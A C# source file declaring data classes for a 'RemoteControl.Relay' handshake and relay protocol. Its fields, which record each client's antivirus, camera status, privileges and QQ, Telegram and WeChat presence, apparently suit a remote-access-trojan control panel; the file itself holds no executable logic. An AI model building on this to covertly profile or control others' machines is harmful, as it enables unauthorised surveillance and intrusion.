namespace RemoteControl.Relay
{
    /// <summary>
    /// 握手数据
    /// </summary>
    public class HandshakeData
    {
        public string Role { get; set; } = "";
        public string ClientId { get; set; } = "";
        public string CustomerId { get; set; } = "";
        public string InstallId { get; set; } = "";
        public string BuildId { get; set; } = "";
        public string HostName { get; set; } = "";
        public string AppPath { get; set; } = "";
        public string OnlineAvatar { get; set; } = "";
        public string UserName { get; set; } = "";
        public string LocalIP { get; set; } = "";
        public string OSVersion { get; set; } = "";
        public string Privilege { get; set; } = "";
        public string CameraStatus { get; set; } = "";
        public string Antivirus { get; set; } = "";
        public string OnlineQQ { get; set; } = "";
        public string TG { get; set; } = "";
        public string WX { get; set; } = "";
        public string UserStatus { get; set; } = "";
        public string Region { get; set; } = "";
        public string ISP { get; set; } = "";
    }

    public class SelectClientData
    {
        public string ClientId { get; set; } = "";
    }

    public class RelayDataFrameData
    {
        public string ClientId { get; set; } = "";
        public string SessionId { get; set; } = "";
        public string RequestId { get; set; } = "";
        public int StreamId { get; set; }
        public int InnerPacketType { get; set; }
        public byte[] Payload { get; set; } = new byte[0];
    }

    public class HostNameData
    {
        public string HostName { get; set; } = "";
        public string AppPath { get; set; } = "";
        public string OnlineAvatar { get; set; } = "";
        public string UserName { get; set; } = "";
        public string LocalIP { get; set; } = "";
        public string OSVersion { get; set; } = "";
        public string Privilege { get; set; } = "";
        public string CameraStatus { get; set; } = "";
        public string Antivirus { get; set; } = "";
        public string OnlineQQ { get; set; } = "";
        public string TG { get; set; } = "";
        public string WX { get; set; } = "";
        public string UserStatus { get; set; } = "";
        public string Region { get; set; } = "";
        public string ISP { get; set; } = "";
    }
}
